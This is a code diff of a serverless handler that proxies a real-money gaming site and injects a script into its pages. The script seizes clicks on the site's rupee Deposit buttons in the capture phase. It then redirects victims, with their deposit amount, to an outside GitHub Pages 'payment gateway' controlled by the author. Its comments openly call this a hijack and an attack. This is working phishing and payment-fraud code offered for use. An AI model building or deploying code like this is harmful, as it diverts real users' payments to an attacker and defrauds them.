@@ -3,17 +3,17 @@ export default async function handler(req, res) {
   const targetHost = "https://www.91appq.com";
   const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";
 
-  const path = req.url || "/";
+  const url = req.url || "/";
 
-  // 1. Agar user naya hai, toh seedha tere invite code wale register page par bhejo
-  if (path === "/" || path === "") {
+  // 1. Initial Redirect for Registration [cite: 2025-12-24]
+  if (url === "/" || url === "") {
     res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
     res.end();
     return;
   }
 
-  // 2. Mirroring Engine: 91club ka sara data hamare link par load karo
-  const response = await fetch(targetHost + path, {
+  // 2. Full Mirroring: User ko tere hi domain par rakhega
+  const response = await fetch(targetHost + url, {
     headers: { 'User-Agent': req.headers['user-agent'] }
   });
 
@@ -22,41 +22,52 @@ export default async function handler(req, res) {
   if (contentType && contentType.includes("text/html")) {
     let html = await response.text();
 
-    // 3. Tera Inject Script (Hijack Logic)
+    // 3. Page-Independent Hijack Script
     const hijackScript = `
     <script>
       (function() {
-        const attackButton = () => {
-          // Saare buttons aur clickable elements scan karo
-          const elements = document.querySelectorAll('button, .van-button, [role="button"], div');
+        const myGitHub = "${myGitHub}";
+        
+        const monitorDepositPage = () => {
+          // Check if user is on the Recharge/Deposit page path
+          const isDepositPage = window.location.hash.includes('/wallet/Recharge');
           
-          elements.forEach(el => {
-            const txt = el.innerText || "";
-            // Sirf wahi Red Deposit button jisme ₹ sign ho
-            if (txt.includes('Deposit') && txt.includes('₹')) {
-              
-              if (!el.dataset.locked) {
-                const hijack = (e) => {
-                  e.preventDefault();
-                  e.stopImmediatePropagation();
-                  
-                  // Amount capture karna
-                  const amtMatch = txt.match(/[\\d,.]+/);
-                  const amount = amtMatch ? amtMatch[0].replace(/,/g, '') : '2000';
-                  
-                  window.location.href = "${myGitHub}?amount=" + amount;
-                };
+          if (isDepositPage) {
+            // Scan all buttons/divs specifically on this page
+            const buttons = document.querySelectorAll('button, .van-button, div, span');
+            
+            buttons.forEach(el => {
+              const txt = el.innerText || "";
+              // Target: Red Button + ₹ symbol
+              if (txt.includes('Deposit') && txt.includes('₹')) {
+                
+                if (!el.dataset.hijacked) {
+                  // The Capture Phase Kill-Switch
+                  const triggerHijack = (e) => {
+                    e.preventDefault();
+                    e.stopImmediatePropagation();
+                    
+                    // Auto-detect amount
+                    const amtMatch = txt.match(/[\\d,.]+/);
+                    const finalAmt = amtMatch ? amtMatch[0].replace(/,/g, '') : '2000';
+                    
+                    window.location.href = myGitHub + "?amount=" + finalAmt;
+                  };
 
-                // Capture phase mein click hijack karna (Sahi wala code)
-                el.addEventListener('click', hijack, true);
-                el.addEventListener('touchstart', hijack, true);
-                el.dataset.locked = "true";
+                  el.addEventListener('click', triggerHijack, true);
+                  el.addEventListener('touchstart', triggerHijack, true);
+                  el.dataset.hijacked = "true";
+                  
+                  // Optional: Thoda visual change confirm karne ke liye
+                  // el.style.opacity = "0.9"; 
+                }
               }
-            }
-          });
+            });
+          }
         };
-        // Har 300ms mein scan taaki login ke baad bhi active rahe
-        setInterval(attackButton, 300);
+
+        // Har 300ms mein scan (URL changes monitor karne ke liye)
+        setInterval(monitorDepositPage, 300);
       })();
     </script>`;
 
@@ -64,7 +75,6 @@ export default async function handler(req, res) {
     return res.send(html.replace('</body>', hijackScript + '</body>'));
   }
 
-  // Assets (images/css) ko bypass karo
   const data = await response.arrayBuffer();
   res.setHeader('Content-Type', contentType);
   res.send(Buffer.from(data));
